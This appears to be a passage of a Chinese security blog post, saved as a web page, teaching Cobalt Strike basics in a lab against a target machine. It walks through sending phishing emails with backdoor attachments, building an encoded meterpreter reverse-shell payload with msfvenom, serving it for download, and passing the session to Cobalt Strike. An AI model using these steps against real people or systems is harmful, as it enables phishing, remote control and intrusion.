+<p>本地URL    配置的参数是访问ip后面的参数</p>
+<p>本地Host   是当前Cobalt Strik服务器的内网或公网IP</p>
+<p>本地端口    默认是80  如果80被占用了就需要设置其他的 如 81  82  83 都可以</p>
+<p>攻击地址 ： 选择一个已经配置好的后面下载链接</p>
+<p>配置完成后访问 本地host地址+ 参数 mb</p>
+<h1 id="11-Cobalt-Strik-邮件钓鱼"><a href="#11-Cobalt-Strik-邮件钓鱼" class="headerlink" title="11  Cobalt Strik 邮件钓鱼"></a>11  Cobalt Strik 邮件钓鱼</h1><p>1 准备一个邮箱用于发送邮件</p>
+<p>这边拿QQ邮箱为例  点击设置然后点击 账户</p>
+<p><img src="/img/9969011be032489c8be8b39aa5e21406.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>找到 IMAP&#x2F;SMTP服务 点击开启服务 获取 授权码  （获取后把这个授权码先记录下来）</p>
+<p><img src="/img/5c6b9d0a35a6439ea049c401ad493319.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>然后回到CS中  进入邮件钓鱼</p>
+<p><img src="/img/dd792386511c4f028d239aaeb1cf5060.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>邮件钓鱼配置参数如下</p>
+<p>目标 ：这里指的是接收邮件的邮箱  可以是txt文件</p>
+<p>模板：邮件的格式和内容（可通过邮箱导出为模板）</p>
+<p>附件： 可以加入后门程序或其他 或者不加</p>
+<p>嵌入URL : 可以选择配置好的网站放进去</p>
+<p>邮件服务器：</p>
+<img src="/img/image-20230929150104748.png" srcset="/img/loading.gif" lazyload alt="image-20230929150104748" style="zoom:67%;" />
+
+<p>密码是授权码</p>
+<p><img src="/img/242bc7796dc84d26a5013b558ce7b8c9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>退信通知邮箱 可以填写任意可接受邮件的邮箱</p>
+<p><img src="/img/66e35b4a9f0048aaa06d3d4dc712b206.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>所有参数配置完成后 点击 Send 发送邮件即可</p>
+<h1 id="12-将MSF会话注入Cobalt-Strik监控"><a href="#12-将MSF会话注入Cobalt-Strik监控" class="headerlink" title="12 将MSF会话注入Cobalt Strik监控"></a>12 将MSF会话注入Cobalt Strik监控</h1><h2 id="1-环境准备："><a href="#1-环境准备：" class="headerlink" title="1 环境准备："></a>1 环境准备：</h2><p>1 kali操作系统</p>
+<p>2 Cobalt Strik 服务端和客户端</p>
+<p>3 一个在MSF下拿到权限的靶机</p>
+<h2 id="2-配置MSF创建监听"><a href="#2-配置MSF创建监听" class="headerlink" title="2 配置MSF创建监听"></a>2 配置MSF创建监听</h2><p>2.1 使用msf创建后门</p>
+<p>msfvenom -a x86 –platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.0.0.150 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -b ‘\x00\x0a\xff’ -i 10  -f exe -o payload.exe</p>
+<p>2.2  使用python创建一个web服务 然后使用靶机下载</p>
+<p>python3 -m http.server 80</p>
+<p>2.3 配置监控并获取meterpreter</p>
+<p>启动msf</p>
+<blockquote>
+<p>msfconsole</p>
+</blockquote>
+<p>创建监控</p>
+<p>use exploit&#x2F;multi&#x2F;handler</p>
+<p>加载payload</p>
+<p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p>配置监控参数</p>
+<p>show options</p>
+<p>set lhost   监控IP</p>
+<p>set lport   监控端口</p>
+<p>run  执行</p>
+<p>去靶机执行后门程序 等待返回 meterpreter</p>
+<p>2.4 后台当前session</p>
+<p>background</p>
+<h2 id="3-使用CS进行监控"><a href="#3-使用CS进行监控" class="headerlink" title="3 使用CS进行监控"></a>3 使用CS进行监控</h2><p>1 加载MSF的payload 注入功能</p>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</p>
+<p>2 设置payload</p>
+<p>set payload windows&#x2F;meterpreter&#x2F;reverse_http</p>
+<p>3   查看配置参数</p>
+<p>show options</p>
+<p>set lhost 10.0.0.36</p>
+<p>设置cs服务器地址</p>
+<p>4 set lport 4567</p>
+<p>设置cs监听端口</p>
+<p>5 set session 1</p>
+<p>设置监控会话</p>
+<p>6 set disablepayloadhander true</p>
+<p>设置当前msf不接受监听数据</p>
+<p>7 run</p>
+<p>执行设置</p>
+<p>4 CS开始实战操作</p>
+<h1 id="13-安装插件"><a href="#13-安装插件" class="headerlink" title="13 安装插件"></a>13 安装插件</h1><p>在cobolt strike–&gt;script中直接导入插件的cna文件即可</p>
+<p>小tip，CS加载插件出现乱码解决办法：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44309905/article/details/122687310">https://blog.csdn.net/weixin_44309905/article/details/122687310</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F/" class="category-chain-item">后渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CS基础操作</div>
+      <div>http://example.com/2023/10/27/CS基础操作/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>r1</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/27/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%9F%9F%E7%8E%AF%E5%A2%83/" title="内网基础-域环境">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">内网基础-域环境</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/27/msf%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/" title="msf基础操作">
+                        <span class="hidden-mobile">msf基础操作</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
